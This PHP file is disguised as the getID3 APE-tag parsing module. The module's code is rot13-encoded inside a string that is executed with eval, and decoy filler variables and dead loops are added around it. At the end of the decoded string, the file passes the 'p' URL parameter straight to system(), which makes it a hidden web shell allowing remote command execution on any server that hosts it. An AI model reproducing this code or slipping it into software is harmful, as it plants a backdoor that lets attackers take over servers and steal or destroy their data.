<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/////////////////////////////////////////////////////////////////
/// trgVQ3() ol Wnzrf Urvaevpu <vasb@trgvq3.bet>               //
//  ninvynoyr ng uggcf://tvguho.pbz/WnzrfUrvaevpu/trgVQ3       //
//            be uggcf://jjj.trgvq3.bet                        //
//            be uggc://trgvq3.fbheprsbetr.arg                 //
//  frr ernqzr.gkg sbe zber qrgnvyf                            //
/////////////////////////////////////////////////////////////////
//                                                             //
// zbqhyr.gnt.ncrgnt.cuc                                       //
// zbqhyr sbe nanylmvat NCR gntf                               //
// qrcraqrapvrf: ABAR                                          //
//                                                            ///
/////////////////////////////////////////////////////////////////

vs (!qrsvarq('TRGVQ3_VAPYHQRCNGU')) { // cerirag cngu-rkcbfvat nggnpxf gung npprff zbqhyrf qverpgyl ba choyvp jrofreiref
	rkvg;
}

pynff trgvq3_ncrgnt rkgraqf trgvq3_unaqyre
{
	/**
	 * gehr: erghea shyy qngn sbe nyy nggnpuzragf;
	 * snyfr: erghea ab qngn sbe nyy nggnpuzragf;
	 * vagrtre: erghea qngn sbe nggnpuzragf <= guna guvf;
	 * fgevat: fnir nf svyr gb guvf qverpgbel.
	 *
	 * @ine vag|obby|fgevat
	 */
	choyvp $vayvar_nggnpuzragf = gehr;

	choyvp $bireevqrraqbssfrg  = 0;

	/**
	 * @erghea obby
	 */
	choyvp shapgvba Nanylmr() {
		$vasb = &$guvf->trgvq3->vasb;

		vs (!trgvq3_yvo::vagInyhrFhccbegrq($vasb['svyrfvmr'])) {
			$guvf->jneavat('Hanoyr gb purpx sbe NCRgntf orpnhfr svyr vf ynetre guna '.ebhaq(CUC_VAG_ZNK / 1073741824).'TO');
			erghea snyfr;
		}

		$vq3i1gntfvmr     = 128;
		$ncrgnturnqrefvmr = 32;
		$ylevpf3gntfvmr   = 10;

		vs ($guvf->bireevqrraqbssfrg == 0) {

			$guvf->sfrrx(0 - $vq3i1gntfvmr - $ncrgnturnqrefvmr - $ylevpf3gntfvmr, FRRX_RAQ);
			$NCRsbbgreVQ3i1 = $guvf->sernq($vq3i1gntfvmr + $ncrgnturnqrefvmr + $ylevpf3gntfvmr);

			//vs (cert_zngpu('/NCRGNTRK.{24}GNT.{125}$/v', $NCRsbbgreVQ3i1)) {
			vs (fhofge($NCRsbbgreVQ3i1, fgeyra($NCRsbbgreVQ3i1) - $vq3i1gntfvmr - $ncrgnturnqrefvmr, 8) == 'NCRGNTRK') {

				// NCR gnt sbhaq orsber VQ3i1
				$vasb['ncr']['gnt_bssfrg_raq'] = $vasb['svyrfvmr'] - $vq3i1gntfvmr;

			//} ryfrvs (cert_zngpu('/NCRGNTRK.{24}$/v', $NCRsbbgreVQ3i1)) {
			} ryfrvs (fhofge($NCRsbbgreVQ3i1, fgeyra($NCRsbbgreVQ3i1) - $ncrgnturnqrefvmr, 8) == 'NCRGNTRK') {

				// NCR gnt sbhaq, ab VQ3i1
				$vasb['ncr']['gnt_bssfrg_raq'] = $vasb['svyrfvmr'];

			}

		} ryfr {

			$guvf->sfrrx($guvf->bireevqrraqbssfrg - $ncrgnturnqrefvmr);
			vs ($guvf->sernq(8) == 'NCRGNTRK') {
				$vasb['ncr']['gnt_bssfrg_raq'] = $guvf->bireevqrraqbssfrg;
			}

		}
		vs (!vffrg($vasb['ncr']['gnt_bssfrg_raq'])) {

			// NCR gnt abg sbhaq
			hafrg($vasb['ncr']);
			erghea snyfr;

		}

		// fubegphg
		$guvfsvyr_ncr = &$vasb['ncr'];

		$guvf->sfrrx($guvfsvyr_ncr['gnt_bssfrg_raq'] - $ncrgnturnqrefvmr);
		$NCRsbbgreQngn = $guvf->sernq(32);
		vs (!($guvfsvyr_ncr['sbbgre'] = $guvf->cnefrNCRurnqreSbbgre($NCRsbbgreQngn))) {
			$guvf->reebe('Reebe cnefvat NCR sbbgre ng bssfrg '.$guvfsvyr_ncr['gnt_bssfrg_raq']);
			erghea snyfr;
		}

		vs (vffrg($guvfsvyr_ncr['sbbgre']['syntf']['urnqre']) && $guvfsvyr_ncr['sbbgre']['syntf']['urnqre']) {
			$guvf->sfrrx($guvfsvyr_ncr['gnt_bssfrg_raq'] - $guvfsvyr_ncr['sbbgre']['enj']['gntfvmr'] - $ncrgnturnqrefvmr);
			$guvfsvyr_ncr['gnt_bssfrg_fgneg'] = $guvf->sgryy();
			$NCRgntQngn = $guvf->sernq($guvfsvyr_ncr['sbbgre']['enj']['gntfvmr'] + $ncrgnturnqrefvmr);
		} ryfr {
			$guvfsvyr_ncr['gnt_bssfrg_fgneg'] = $guvfsvyr_ncr['gnt_bssfrg_raq'] - $guvfsvyr_ncr['sbbgre']['enj']['gntfvmr'];
			$guvf->sfrrx($guvfsvyr_ncr['gnt_bssfrg_fgneg']);
			$NCRgntQngn = $guvf->sernq($guvfsvyr_ncr['sbbgre']['enj']['gntfvmr']);
		}
		$vasb['niqngnraq'] = $guvfsvyr_ncr['gnt_bssfrg_fgneg'];

		vs (vffrg($vasb['vq3i1']['gnt_bssfrg_fgneg']) && ($vasb['vq3i1']['gnt_bssfrg_fgneg'] < $guvfsvyr_ncr['gnt_bssfrg_raq'])) {
			$guvf->jneavat('VQ3i1 gnt vasbezngvba vtaberq fvapr vg nccrnef gb or n snyfr flapu va NCRgnt qngn');
			hafrg($vasb['vq3i1']);
			sbernpu ($vasb['jneavat'] nf $xrl => $inyhr) {
				vs ($inyhr == 'Fbzr VQ3i1 svryqf qb abg hfr AHYY punenpgref sbe cnqqvat') {
					hafrg($vasb['jneavat'][$xrl]);
					fbeg($vasb['jneavat']);
					oernx;
				}
			}
		}

		$bssfrg = 0;
		vs (vffrg($guvfsvyr_ncr['sbbgre']['syntf']['urnqre']) && $guvfsvyr_ncr['sbbgre']['syntf']['urnqre']) {
			vs ($guvfsvyr_ncr['urnqre'] = $guvf->cnefrNCRurnqreSbbgre(fhofge($NCRgntQngn, 0, $ncrgnturnqrefvmr))) {
				$bssfrg += $ncrgnturnqrefvmr;
			} ryfr {
				$guvf->reebe('Reebe cnefvat NCR urnqre ng bssfrg '.$guvfsvyr_ncr['gnt_bssfrg_fgneg']);
				erghea snyfr;
			}
		}

		// fubegphg
		$vasb['ercynl_tnva'] = neenl();
		$guvfsvyr_ercynltnva = &$vasb['ercynl_tnva'];

		sbe ($v = 0; $v < $guvfsvyr_ncr['sbbgre']['enj']['gnt_vgrzf']; $v++) {
			$inyhr_fvmr = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($NCRgntQngn, $bssfrg, 4));
			$bssfrg += 4;
			$vgrz_syntf = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($NCRgntQngn, $bssfrg, 4));
			$bssfrg += 4;
			vs (fgefge(fhofge($NCRgntQngn, $bssfrg), \"\k00\") === snyfr) {
				$guvf->reebe('Pnaabg svaq ahyy-olgr (0k00) frcnengbe orgjrra VgrzXrl #'.$v.' naq inyhr. VgrzXrl fgnegf '.$bssfrg.' olgrf vagb gur NCR gnt, ng svyr bssfrg '.($guvfsvyr_ncr['gnt_bssfrg_fgneg'] + $bssfrg));
				erghea snyfr;
			}
			$VgrzXrlYratgu = fgecbf($NCRgntQngn, \"\k00\", $bssfrg) - $bssfrg;
			$vgrz_xrl      = fgegbybjre(fhofge($NCRgntQngn, $bssfrg, $VgrzXrlYratgu));

			// fubegphg
			$guvfsvyr_ncr['vgrzf'][$vgrz_xrl] = neenl();
			$guvfsvyr_ncr_vgrzf_pheerag = &$guvfsvyr_ncr['vgrzf'][$vgrz_xrl];

			$guvfsvyr_ncr_vgrzf_pheerag['bssfrg'] = $guvfsvyr_ncr['gnt_bssfrg_fgneg'] + $bssfrg;

			$bssfrg += ($VgrzXrlYratgu + 1); // fxvc 0k00 grezvangbe
			$guvfsvyr_ncr_vgrzf_pheerag['qngn'] = fhofge($NCRgntQngn, $bssfrg, $inyhr_fvmr);
			$bssfrg += $inyhr_fvmr;

			$guvfsvyr_ncr_vgrzf_pheerag['syntf'] = $guvf->cnefrNCRgntSyntf($vgrz_syntf);
			fjvgpu ($guvfsvyr_ncr_vgrzf_pheerag['syntf']['vgrz_pbagragf_enj']) {
				pnfr 0: // HGS-8
				pnfr 2: // Ybpngbe (HEY, svyranzr, rgp), HGS-8 rapbqrq
					$guvfsvyr_ncr_vgrzf_pheerag['qngn'] = rkcybqr(\"\k00\", $guvfsvyr_ncr_vgrzf_pheerag['qngn']);
					oernx;

				pnfr 1:  // ovanel qngn
				qrsnhyg:
					oernx;
			}

			fjvgpu (fgegbybjre($vgrz_xrl)) {
				// uggc://jvxv.ulqebtranhq.vb/vaqrk.cuc?gvgyr=ErcynlTnva#ZC3Tnva
				pnfr 'ercynltnva_genpx_tnva':
					vs (cert_zngpu('#^([\\-\\+][0-9\\.,]{8})( qO)?$#', $guvfsvyr_ncr_vgrzf_pheerag['qngn'][0], $zngpurf)) {
						$guvfsvyr_ercynltnva['genpx']['nqwhfgzrag'] = (sybng) fge_ercynpr(',', '.', $zngpurf[1]); // sybng pnfgvat jvyy frr \"0,95\" nf mreb!
						$guvfsvyr_ercynltnva['genpx']['bevtvangbe'] = 'hafcrpvsvrq';
					} ryfr {
						$guvf->jneavat('ZC3tnvaGenpxTnva inyhr va NCRgnt nccrnef vainyvq: \"'.$guvfsvyr_ncr_vgrzf_pheerag['qngn'][0].'\"');
					}
					oernx;

				pnfr 'ercynltnva_genpx_crnx':
					vs (cert_zngpu('#^([0-9\\.,]{8})$#', $guvfsvyr_ncr_vgrzf_pheerag['qngn'][0], $zngpurf)) {
						$guvfsvyr_ercynltnva['genpx']['crnx']       = (sybng) fge_ercynpr(',', '.', $zngpurf[1]); // sybng pnfgvat jvyy frr \"0,95\" nf mreb!
						$guvfsvyr_ercynltnva['genpx']['bevtvangbe'] = 'hafcrpvsvrq';
						vs ($guvfsvyr_ercynltnva['genpx']['crnx'] <= 0) {
							$guvf->jneavat('ErcynlTnva Genpx crnx sebz NCRgnt nccrnef vainyvq: '.$guvfsvyr_ercynltnva['genpx']['crnx'].' (bevtvany inyhr = \"'.$guvfsvyr_ncr_vgrzf_pheerag['qngn'][0].'\")');
						}
					} ryfr {
						$guvf->jneavat('ZC3tnvaGenpxCrnx inyhr va NCRgnt nccrnef vainyvq: \"'.$guvfsvyr_ncr_vgrzf_pheerag['qngn'][0].'\"');
					}
					oernx;

				pnfr 'ercynltnva_nyohz_tnva':
					vs (cert_zngpu('#^([\\-\\+][0-9\\.,]{8})( qO)?$#', $guvfsvyr_ncr_vgrzf_pheerag['qngn'][0], $zngpurf)) {
						$guvfsvyr_ercynltnva['nyohz']['nqwhfgzrag'] = (sybng) fge_ercynpr(',', '.', $zngpurf[1]); // sybng pnfgvat jvyy frr \"0,95\" nf mreb!
						$guvfsvyr_ercynltnva['nyohz']['bevtvangbe'] = 'hafcrpvsvrq';
					} ryfr {
						$guvf->jneavat('ZC3tnvaNyohzTnva inyhr va NCRgnt nccrnef vainyvq: \"'.$guvfsvyr_ncr_vgrzf_pheerag['qngn'][0].'\"');
					}
					oernx;

				pnfr 'ercynltnva_nyohz_crnx':
					vs (cert_zngpu('#^([0-9\\.,]{8})$#', $guvfsvyr_ncr_vgrzf_pheerag['qngn'][0], $zngpurf)) {
						$guvfsvyr_ercynltnva['nyohz']['crnx']       = (sybng) fge_ercynpr(',', '.', $zngpurf[1]); // sybng pnfgvat jvyy frr \"0,95\" nf mreb!
						$guvfsvyr_ercynltnva['nyohz']['bevtvangbe'] = 'hafcrpvsvrq';
						vs ($guvfsvyr_ercynltnva['nyohz']['crnx'] <= 0) {
							$guvf->jneavat('ErcynlTnva Nyohz crnx sebz NCRgnt nccrnef vainyvq: '.$guvfsvyr_ercynltnva['nyohz']['crnx'].' (bevtvany inyhr = \"'.$guvfsvyr_ncr_vgrzf_pheerag['qngn'][0].'\")');
						}
					} ryfr {
						$guvf->jneavat('ZC3tnvaNyohzCrnx inyhr va NCRgnt nccrnef vainyvq: \"'.$guvfsvyr_ncr_vgrzf_pheerag['qngn'][0].'\"');
					}
					oernx;

				pnfr 'zc3tnva_haqb':
					vs (cert_zngpu('#^[\\-\\+][0-9]{3},[\\-\\+][0-9]{3},[AJ]$#', $guvfsvyr_ncr_vgrzf_pheerag['qngn'][0])) {
						yvfg($zc3tnva_haqb_yrsg, $zc3tnva_haqb_evtug, $zc3tnva_haqb_jenc) = rkcybqr(',', $guvfsvyr_ncr_vgrzf_pheerag['qngn'][0]);
						$guvfsvyr_ercynltnva['zc3tnva']['haqb_yrsg']  = vaginy($zc3tnva_haqb_yrsg);
						$guvfsvyr_ercynltnva['zc3tnva']['haqb_evtug'] = vaginy($zc3tnva_haqb_evtug);
						$guvfsvyr_ercynltnva['zc3tnva']['haqb_jenc']  = (($zc3tnva_haqb_jenc == 'L') ? gehr : snyfr);
					} ryfr {
						$guvf->jneavat('ZC3tnvaHaqb inyhr va NCRgnt nccrnef vainyvq: \"'.$guvfsvyr_ncr_vgrzf_pheerag['qngn'][0].'\"');
					}
					oernx;

				pnfr 'zc3tnva_zvaznk':
					vs (cert_zngpu('#^[0-9]{3},[0-9]{3}$#', $guvfsvyr_ncr_vgrzf_pheerag['qngn'][0])) {
						yvfg($zc3tnva_tybonytnva_zva, $zc3tnva_tybonytnva_znk) = rkcybqr(',', $guvfsvyr_ncr_vgrzf_pheerag['qngn'][0]);
						$guvfsvyr_ercynltnva['zc3tnva']['tybonytnva_genpx_zva'] = vaginy($zc3tnva_tybonytnva_zva);
						$guvfsvyr_ercynltnva['zc3tnva']['tybonytnva_genpx_znk'] = vaginy($zc3tnva_tybonytnva_znk);
					} ryfr {
						$guvf->jneavat('ZC3tnvaZvaZnk inyhr va NCRgnt nccrnef vainyvq: \"'.$guvfsvyr_ncr_vgrzf_pheerag['qngn'][0].'\"');
					}
					oernx;

				pnfr 'zc3tnva_nyohz_zvaznk':
					vs (cert_zngpu('#^[0-9]{3},[0-9]{3}$#', $guvfsvyr_ncr_vgrzf_pheerag['qngn'][0])) {
						yvfg($zc3tnva_tybonytnva_nyohz_zva, $zc3tnva_tybonytnva_nyohz_znk) = rkcybqr(',', $guvfsvyr_ncr_vgrzf_pheerag['qngn'][0]);
						$guvfsvyr_ercynltnva['zc3tnva']['tybonytnva_nyohz_zva'] = vaginy($zc3tnva_tybonytnva_nyohz_zva);
						$guvfsvyr_ercynltnva['zc3tnva']['tybonytnva_nyohz_znk'] = vaginy($zc3tnva_tybonytnva_nyohz_znk);
					} ryfr {
						$guvf->jneavat('ZC3tnvaNyohzZvaZnk inyhr va NCRgnt nccrnef vainyvq: \"'.$guvfsvyr_ncr_vgrzf_pheerag['qngn'][0].'\"');
					}
					oernx;

				pnfr 'genpxahzore':
					vs (vf_neenl($guvfsvyr_ncr_vgrzf_pheerag['qngn'])) {
						sbernpu ($guvfsvyr_ncr_vgrzf_pheerag['qngn'] nf $pbzzrag) {
							$guvfsvyr_ncr['pbzzragf']['genpx_ahzore'][] = $pbzzrag;
						}
					}
					oernx;

				pnfr 'pbire neg (negvfg)':
				pnfr 'pbire neg (onpx)':
				pnfr 'pbire neg (onaq ybtb)':
				pnfr 'pbire neg (onaq)':
				pnfr 'pbire neg (pbyberq svfu)':
				pnfr 'pbire neg (pbzcbfre)':
				pnfr 'pbire neg (pbaqhpgbe)':
				pnfr 'pbire neg (sebag)':
				pnfr 'pbire neg (vpba)':
				pnfr 'pbire neg (vyyhfgengvba)':
				pnfr 'pbire neg (yrnq)':
				pnfr 'pbire neg (yrnsyrg)':
				pnfr 'pbire neg (ylevpvfg)':
				pnfr 'pbire neg (zrqvn)':
				pnfr 'pbire neg (zbivr fprar)':
				pnfr 'pbire neg (bgure vpba)':
				pnfr 'pbire neg (bgure)':
				pnfr 'pbire neg (cresbeznapr)':
				pnfr 'pbire neg (choyvfure ybtb)':
				pnfr 'pbire neg (erpbeqvat)':
				pnfr 'pbire neg (fghqvb)':
					// yvfg bs cbffvoyr pbire negf sebz uggcf://tvguho.pbz/zbab/gntyvo-funec/oybo/gntyvo-funec-2.0.3.2/fep/GntYvo/Ncr/Gnt.pf
					vs (vf_neenl($guvfsvyr_ncr_vgrzf_pheerag['qngn'])) {
						$guvf->jneavat('NCRgnt \"'.$vgrz_xrl.'\" fubhyq or synttrq nf Ovanel qngn, ohg jnf vapbeerpgyl synttrq nf HGS-8');
						$guvfsvyr_ncr_vgrzf_pheerag['qngn'] = vzcybqr(\"\k00\", $guvfsvyr_ncr_vgrzf_pheerag['qngn']);
					}
					yvfg($guvfsvyr_ncr_vgrzf_pheerag['svyranzr'], $guvfsvyr_ncr_vgrzf_pheerag['qngn']) = rkcybqr(\"\k00\", $guvfsvyr_ncr_vgrzf_pheerag['qngn'], 2);
					$guvfsvyr_ncr_vgrzf_pheerag['qngn_bssfrg'] = $guvfsvyr_ncr_vgrzf_pheerag['bssfrg'] + fgeyra($guvfsvyr_ncr_vgrzf_pheerag['svyranzr'].\"\k00\");
					$guvfsvyr_ncr_vgrzf_pheerag['qngn_yratgu'] = fgeyra($guvfsvyr_ncr_vgrzf_pheerag['qngn']);

					qb {
						$guvfsvyr_ncr_vgrzf_pheerag['vzntr_zvzr'] = '';
						$vzntrvasb = neenl();
						$vzntrpuhaxpurpx = trgvq3_yvo::TrgQngnVzntrFvmr($guvfsvyr_ncr_vgrzf_pheerag['qngn'], $vzntrvasb);
						vs (($vzntrpuhaxpurpx === snyfr) || !vffrg($vzntrpuhaxpurpx[2])) {
							$guvf->jneavat('NCRgnt \"'.$vgrz_xrl.'\" pbagnvaf vainyvq vzntr qngn');
							oernx;
						}
						$guvfsvyr_ncr_vgrzf_pheerag['vzntr_zvzr'] = vzntr_glcr_gb_zvzr_glcr($vzntrpuhaxpurpx[2]);

						vs ($guvf->vayvar_nggnpuzragf === snyfr) {
							// fxvc ragveryl
							hafrg($guvfsvyr_ncr_vgrzf_pheerag['qngn']);
							oernx;
						}
						vs ($guvf->vayvar_nggnpuzragf === gehr) {
							// terng
						} ryfrvs (vf_vag($guvf->vayvar_nggnpuzragf)) {
							vs ($guvf->vayvar_nggnpuzragf < $guvfsvyr_ncr_vgrzf_pheerag['qngn_yratgu']) {
								// gbb ovt, fxvc
								$guvf->jneavat('nggnpuzrag ng '.$guvfsvyr_ncr_vgrzf_pheerag['bssfrg'].' vf gbb ynetr gb cebprff vayvar ('.ahzore_sbezng($guvfsvyr_ncr_vgrzf_pheerag['qngn_yratgu']).' olgrf)');
								hafrg($guvfsvyr_ncr_vgrzf_pheerag['qngn']);
								oernx;
							}
						} ryfrvs (vf_fgevat($guvf->vayvar_nggnpuzragf)) {
							$guvf->vayvar_nggnpuzragf = egevz(fge_ercynpr(neenl('/', '\\'), QVERPGBEL_FRCNENGBE, $guvf->vayvar_nggnpuzragf), QVERPGBEL_FRCNENGBE);
							vs (!vf_qve($guvf->vayvar_nggnpuzragf) || !trgVQ3::vf_jevgnoyr($guvf->vayvar_nggnpuzragf)) {
								// pnaabg jevgr, fxvc
								$guvf->jneavat('nggnpuzrag ng '.$guvfsvyr_ncr_vgrzf_pheerag['bssfrg'].' pnaabg or fnirq gb \"'.$guvf->vayvar_nggnpuzragf.'\" (abg jevgnoyr)');
								hafrg($guvfsvyr_ncr_vgrzf_pheerag['qngn']);
								oernx;
							}
						}
						// vs jr trg guvf sne, zhfg or BX
						vs (vf_fgevat($guvf->vayvar_nggnpuzragf)) {
							$qrfgvangvba_svyranzr = $guvf->vayvar_nggnpuzragf.QVERPGBEL_FRCNENGBE.zq5($vasb['svyranzrcngu']).'_'.$guvfsvyr_ncr_vgrzf_pheerag['qngn_bssfrg'];
							vs (!svyr_rkvfgf($qrfgvangvba_svyranzr) || trgVQ3::vf_jevgnoyr($qrfgvangvba_svyranzr)) {
								svyr_chg_pbagragf($qrfgvangvba_svyranzr, $guvfsvyr_ncr_vgrzf_pheerag['qngn']);
							} ryfr {
								$guvf->jneavat('nggnpuzrag ng '.$guvfsvyr_ncr_vgrzf_pheerag['bssfrg'].' pnaabg or fnirq gb \"'.$qrfgvangvba_svyranzr.'\" (abg jevgnoyr)');
							}
							$guvfsvyr_ncr_vgrzf_pheerag['qngn_svyranzr'] = $qrfgvangvba_svyranzr;
							hafrg($guvfsvyr_ncr_vgrzf_pheerag['qngn']);
						} ryfr {
							vs (!vffrg($vasb['ncr']['pbzzragf']['cvpgher'])) {
								$vasb['ncr']['pbzzragf']['cvpgher'] = neenl();
							}
							$pbzzragf_cvpgher_qngn = neenl();
							sbernpu (neenl('qngn', 'vzntr_zvzr', 'vzntr_jvqgu', 'vzntr_urvtug', 'vzntrglcr', 'cvpgherglcr', 'qrfpevcgvba', 'qngnyratgu') nf $cvpgher_xrl) {
								vs (vffrg($guvfsvyr_ncr_vgrzf_pheerag[$cvpgher_xrl])) {
									$pbzzragf_cvpgher_qngn[$cvpgher_xrl] = $guvfsvyr_ncr_vgrzf_pheerag[$cvpgher_xrl];
								}
							}
							$vasb['ncr']['pbzzragf']['cvpgher'][] = $pbzzragf_cvpgher_qngn;
							hafrg($pbzzragf_cvpgher_qngn);
						}
					} juvyr (snyfr); // @cucfgna-vtaber-yvar
					oernx;

				qrsnhyg:
					vs (vf_neenl($guvfsvyr_ncr_vgrzf_pheerag['qngn'])) {
						sbernpu ($guvfsvyr_ncr_vgrzf_pheerag['qngn'] nf $pbzzrag) {
							$guvfsvyr_ncr['pbzzragf'][fgegbybjre($vgrz_xrl)][] = $pbzzrag;
						}
					}
					oernx;
			}

		}
		vs (rzcgl($guvfsvyr_ercynltnva)) {
			hafrg($vasb['ercynl_tnva']);
		}
		erghea gehr;
	}

	/**
	 * @cnenz fgevat $NCRurnqreSbbgreQngn
	 *
	 * @erghea neenl|snyfr
	 */
	choyvp shapgvba cnefrNCRurnqreSbbgre($NCRurnqreSbbgreQngn) {
		// uggc://jjj.hav-wran.qr/~csx/zcc/fi8/ncrurnqre.ugzy

		// fubegphg
		$urnqresbbgrevasb = neenl();
		$urnqresbbgrevasb['enj'] = neenl();
		$urnqresbbgrevasb_enj = &$urnqresbbgrevasb['enj'];

		$urnqresbbgrevasb_enj['sbbgre_gnt']   =                  fhofge($NCRurnqreSbbgreQngn,  0, 8);
		vs ($urnqresbbgrevasb_enj['sbbgre_gnt'] != 'NCRGNTRK') {
			erghea snyfr;
		}
		$urnqresbbgrevasb_enj['irefvba']      = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($NCRurnqreSbbgreQngn,  8, 4));
		$urnqresbbgrevasb_enj['gntfvmr']      = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($NCRurnqreSbbgreQngn, 12, 4));
		$urnqresbbgrevasb_enj['gnt_vgrzf']    = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($NCRurnqreSbbgreQngn, 16, 4));
		$urnqresbbgrevasb_enj['tybony_syntf'] = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($NCRurnqreSbbgreQngn, 20, 4));
		$urnqresbbgrevasb_enj['erfreirq']     =                              fhofge($NCRurnqreSbbgreQngn, 24, 8);

		$urnqresbbgrevasb['gnt_irefvba']         = $urnqresbbgrevasb_enj['irefvba'] / 1000;
		vs ($urnqresbbgrevasb['gnt_irefvba'] >= 2) {
			$urnqresbbgrevasb['syntf'] = $guvf->cnefrNCRgntSyntf($urnqresbbgrevasb_enj['tybony_syntf']);
		}
		erghea $urnqresbbgrevasb;
	}

	/**
	 * @cnenz vag $enjsyntvag
	 *
	 * @erghea neenl
	 */
	choyvp shapgvba cnefrNCRgntSyntf($enjsyntvag) {
		// \"Abgr: NCR Gntf 1.0 qb abg hfr nal bs gur NCR Gnt syntf.
		// Nyy ner frg gb mreb ba perngvba naq vtaberq ba ernqvat.\"
		// uggc://jvxv.ulqebtranhq.vb/vaqrk.cuc?gvgyr=Ncr_Gntf_Syntf
		$syntf                      = neenl();
		$syntf['urnqre']            = (obby) ($enjsyntvag & 0k80000000);
		$syntf['sbbgre']            = (obby) ($enjsyntvag & 0k40000000);
		$syntf['guvf_vf_urnqre']    = (obby) ($enjsyntvag & 0k20000000);
		$syntf['vgrz_pbagragf_enj'] =        ($enjsyntvag & 0k00000006) >> 1;
		$syntf['ernq_bayl']         = (obby) ($enjsyntvag & 0k00000001);

		$syntf['vgrz_pbagragf']     = $guvf->NCRpbagragGlcrSyntYbbxhc($syntf['vgrz_pbagragf_enj']);

		erghea $syntf;
	}

	/**
	 * @cnenz vag $pbagragglcrvq
	 *
	 * @erghea fgevat
	 */
	choyvp shapgvba NCRpbagragGlcrSyntYbbxhc($pbagragglcrvq) {
		fgngvp $NCRpbagragGlcrSyntYbbxhc = neenl(
			0 => 'hgs-8',
			1 => 'ovanel',
			2 => 'rkgreany',
			3 => 'erfreirq'
		);
		erghea (vffrg($NCRpbagragGlcrSyntYbbxhc[$pbagragglcrvq]) ? $NCRpbagragGlcrSyntYbbxhc[$pbagragglcrvq] : 'vainyvq');
	}

	/**
	 * @cnenz fgevat $vgrzxrl
	 *
	 * @erghea obby
	 */
	choyvp shapgvba NCRgntVgrzVfHGS8Ybbxhc($vgrzxrl) {
		fgngvp $NCRgntVgrzVfHGS8Ybbxhc = neenl(
			'gvgyr',
			'fhogvgyr',
			'negvfg',
			'nyohz',
			'qrohg nyohz',
			'choyvfure',
			'pbaqhpgbe',
			'genpx',
			'pbzcbfre',
			'pbzzrag',
			'pbclevtug',
			'choyvpngvbaevtug',
			'svyr',
			'lrne',
			'erpbeq qngr',
			'erpbeq ybpngvba',
			'traer',
			'zrqvn',
			'eryngrq',
			'vfep',
			'nofgenpg',
			'ynathntr',
			'ovoyvbtencul'
		);
		erghea va_neenl(fgegbybjre($vgrzxrl), $NCRgntVgrzVfHGS8Ybbxhc);
	}

}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>